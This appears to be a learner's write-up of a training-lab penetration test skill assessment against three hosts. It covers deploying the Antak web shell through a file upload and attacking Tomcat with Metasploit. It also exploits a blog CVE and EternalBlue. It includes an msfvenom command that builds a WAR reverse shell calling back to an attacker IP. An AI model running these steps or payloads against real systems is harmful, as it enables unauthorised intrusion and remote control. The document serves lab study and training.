# Skill Assessment

With this skill assessment, I had a very bad time using my own attacking machine not their pwnbox. Everything worked fine with the pwnbox but the latency...

We are given a foothold already on the internal network, so it's gonna be an internal pentest on their web apps.

Upon connecting with xfreerdp&#x20;

## HOST 1

<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption><p>Internal network</p></figcaption></figure>

Checking the status.inalenfreight.local on port 80 we find this website :

<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

Obviously, we have a file upload field in there. But before checking this website I also checked status.inlanefreight.local on port 8080 and found another web portal for configuring apps on an Apache server.&#x20;

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption><p>Apache Tomcat config portal</p></figcaption></figure>

Okay now we'll stick with the first one and just go with the Antak web shell since it's a windows target, so we make a copy of it on a directory of our choice and then modify the username and passsword.

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Upon successful upload here are some ways of getting the hostname and share name:

```powershell
PS> hostname
PS> [System.Net.Dns]::GetHostName()
PS> (Get-WmiObject -Class Win32_ComputerSystem).Name
```

<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

Now lets try to find another way to access the target machine since we have the tomcat portal and tomcat access creds on our desktop:

<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

At this point I tested metasploit with the following commands :&#x20;

```bash
msfconsole> search exploit tomcat -os:windows
msfconsole> use multi/http/tomcat_mgr_upload # Didn't work
msfconsole> use multi/http/tomcat_mgr_deploy # Didn't work
```

With both failed and looking a bit on google, i found out that this can't get us a webshell but a reverse shell, we need a war file specific for a windows target hosting the tomcat version, <mark style="color:green;">so we gotta craft our own payload using msfvenom.</mark>

```bash
$msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=9443 -f war > shell.war
```

After setting up a listener and uploading, deploying the war file, we got a succesful hit back:

<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

## HOST 2

The second host which hosts a blog is self explanatory already giving us intel about a CVE and even an exploit ready for use on the foothold machine even login creds as an admin: Free Win

So after a bit of research i found out that the goal behind this thing is importing exploitdb exploits into metasploit because this exploit isn't loaded yet.

I run into this blog which explained it well:

{% embed url="https://fosonecy.home.blog/2019/11/04/how-to-importing-exploit-db-exploits-into-metasploit-in-kali-linux-the-easy-way/" %}

{% hint style="warning" %}
After poking around a little bit i found out that the module is already loaded in metasploit lol so no need to load it again, but you know that was a good practice either ways.
{% endhint %}

So, after configuring the VHOST, RHOST, RPORT, USERNAME and USERPASSWORD fields on metasploit exploit options we get our beloved shell on the target host:

<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

## HOST 3

{% hint style="danger" %}
For this host i made a huge mistake of not sticking with the subnet they provided before the questions, instead of scanning 172.16.1.13 i went for lab.inlanefreight.local which was in the /etc/hosts. Definitely a rabbit hole.
{% endhint %}

Here are the nmap results:



<figure><img src="../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

As mentioned in [here](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010), when we see Windows Server 2016, 2008..etc we should think of the one and only EternalBlue. Which is confirmed in the nmap scan :&#x20;

<figure><img src="../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

So not much thought in here, metasploit is the way to go, and as simple as we did on the Exploiting Windows part, we easily get a Shell on the final target host!

<figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

